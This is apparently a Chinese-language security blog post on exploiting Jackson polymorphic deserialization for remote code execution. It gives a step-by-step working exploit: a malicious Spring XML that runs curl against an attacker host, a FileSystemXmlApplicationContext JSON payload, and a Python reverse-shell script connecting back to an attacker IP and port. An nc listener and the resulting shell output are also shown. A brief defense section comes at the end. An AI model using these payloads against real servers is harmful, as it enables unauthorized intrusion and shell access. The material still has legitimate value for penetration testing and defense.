---
layout: post
toc: true
title: "「漏洞复现」:Jackson反序列化漏洞利用总结"
wrench: 2020-09-01
author: Bin4xin
categories:
    - blog
    - 笔记
    - CVE
    - 漏洞复现
    - Java
    - Jackson
permalink: /blog/2020/json/vuln-Cve/
---

> Jackson是Java生态中最流行的JSON序列化/反序列化库之一。当目标使用了`enableDefaultTyping()`或`@JsonTypeInfo`注解时，攻击者可通过构造恶意JSON实现任意代码执行。本文记录Jackson反序列化漏洞的识别、利用与实战踩坑。

## 0x00 区分 Fastjson 和 Jackson

在实际渗透测试中，首先需要判断目标使用的是Fastjson还是Jackson，两者的错误行为不同：

发送如下请求，包含多余的key：

```
POST /api/endpoint HTTP/1.1
Content-Type: application/json

{"name":"S", "age":21, "extra_invalid_key":123}
```

{:.table}
| 特征 | Fastjson | Jackson |
|------|----------|---------|
| 多余key | **不报错**（自动忽略） | **报错**（严格对齐） |
| 少key | 不报错 | 不报错 |
| 错误信息 | 无 | `UnrecognizedPropertyException` |

> **判断依据**：Jackson强制key与JavaBean属性对齐，只能少不能多，多余key会抛出异常；而Fastjson会自动忽略未知字段。

## 0x01 漏洞原理

Jackson反序列化漏洞的核心在于使用了**多态反序列化**（Polymorphic Deserialization），常见于：

1. 调用了`ObjectMapper.enableDefaultTyping()`方法
2. 使用了`@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)`注解
3. 属性类型声明为`Object`或接口类型

当目标存在上述配置时，攻击者可以在JSON数据中指定任意Java类作为反序列化的目标类型，从而触发**Gadget Chain**实现RCE。

### 常见Gadget Chain

{:.table}
| Gadget | 依赖 | 效果 |
|--------|------|------|
| `FileSystemXmlApplicationContext` | Spring Framework | 加载远程XML配置执行代码 |
| `JndiDataSourceFactory` | MyBatis | JNDI注入 |
| `xbean-reflect` | Apache XBean | XBean反射利用 |
| `TemplatesImpl` | JDK | 通过Bytecode加载执行命令 |

## 0x02 利用方式一：FileSystemXmlApplicationContext + Spring XML RCE

这是最常用的Jackson RCE利用方式，需要目标依赖了`spring-context`。

### Step 1：编写恶意Spring XML

在攻击机上创建`jackson1.xml`：

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <array>
                <value>curl</value>
                <value>http://<attack_ip>:8000/pc.py</value>
            </array>
        </constructor-arg>
        <property name="any" value="#{ pb.start() }"/>
    </bean>
</beans>
```

### Step 2：启动HTTP服务托管XML

```bash
# 攻击机启动HTTP服务
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Step 3：发送恶意Payload

```bash
POST /exploit HTTP/1.1
Host: 192.168.43.14:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Content-Length: 142

{
  "param": [
   "org.springframework.context.support.FileSystemXmlApplicationContext",
   "http://<attack_ip>:8000/jackson1.xml"
  ]
}
```

> **关键点**：`FileSystemXmlApplicationContext`会从远程URL加载Spring XML配置，XML中的`ProcessBuilder` Bean会自动实例化并执行命令。

### Step 4：验证回连

```bash
# 攻击机HTTP服务日志
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<underAttack_ip> - - [31/Aug/2020 16:05:12] "GET /jackson1.xml HTTP/1.1" 200 -
<underAttack_ip> - - [31/Aug/2020 16:05:12] "GET /jackson1.xml HTTP/1.1" 200 -
<underAttack_ip> - - [31/Aug/2020 16:05:12] "GET /pc.py HTTP/1.1" 404 -
```

目标服务器已请求了`jackson1.xml`，说明XML被加载执行。如果`pc.py`文件存在则会被curl下载到目标服务器。

## 0x03 GetShell反弹Shell

将`pc.py`替换为反弹Shell脚本：

```python
#!/usr/bin/env python3
# pc.py
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<attack_ip>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

修改XML中的`ProcessBuilder`参数：

```xml
<bean id="pb" class="java.lang.ProcessBuilder">
    <constructor-arg>
        <array>
            <value>python</value>
            <value>/tmp/pc.py</value>
        </array>
    </constructor-arg>
    <property name="any" value="#{ pb.start() }"/>
</bean>
```

攻击机监听：

```bash
nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from <underAttack_ip> received!
$ id
uid=1000(app) gid=1000(app) groups=1000(app)
```

## 0x04 实战：探测Jackson

在实际渗透中，通过观察错误响应判断是否使用Jackson：

```bash
POST /api/endpoint HTTP/1.1
Host: <underAttack_ip>
Content-Type: application/json;charset=UTF-8

{"name":"S", "age":21}
```

如果返回如下Jackson风格的错误堆栈，即可确认使用了Jackson：

```json
{
  "code": null,
  "msg": null,
  "data": {
    "cause": null,
    "stackTrace": [
      {
        "className": "javax.mail.internet.InternetAddress",
        "methodName": "parse",
        "fileName": "InternetAddress.java",
        "lineNumber": 696
      },
      ...
      {
        "className": "java.lang.Thread",
        "methodName": "run",
        "fileName": "Thread.java",
        "lineNumber": 830
      }
    ],
    "message": null
  }
}
```

> **判断标准**：响应中包含`stackTrace`数组，每个元素包含`className`、`methodName`、`fileName`、`lineNumber`字段——这是Jackson序列化Java异常对象的典型格式。

## 0x05 利用条件与限制

{:.table}
| 条件 | 说明 |
|------|------|
| 启用多态反序列化 | `enableDefaultTyping()` 或 `@JsonTypeInfo` |
| Spring依赖 | `FileSystemXmlApplicationContext`需要spring-context |
| 外连能力 | 目标服务器需能访问攻击机HTTP服务 |
| 文件写入 | 部分利用方式需要写入临时文件 |

## 0x06 防御措施

1. **禁用`enableDefaultTyping()`**：这是最根本的防御措施
2. **使用白名单**：通过`@JsonTypeInfo`限制可反序列化的类型
3. **升级Jackson版本**：`jackson-databind >= 2.10`默认禁用危险类型
4. **移除危险依赖**：避免在classpath中包含已知Gadget链依赖

```java
// 安全配置示例
ObjectMapper mapper = new ObjectMapper();
// 不要调用 enableDefaultTyping()
// 使用 @JsonTypeInfo 注解限制类型范围
```

## 参考

- [Jackson-databind反序列化漏洞汇总](https://github.com/FasterXML/jackson-databind/issues){:target="_blank"}
- [Exploiting Jackson-RCE via deserialization](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html){:target="_blank"}
- [Spring FileSystemXmlApplicationContext利用](https://i-safe.sourceforge.net/){:target="_blank"}
- [Fastjson vs Jackson识别](https://www.freebuf.com/vuls/246941.html){:target="_blank"}

以上。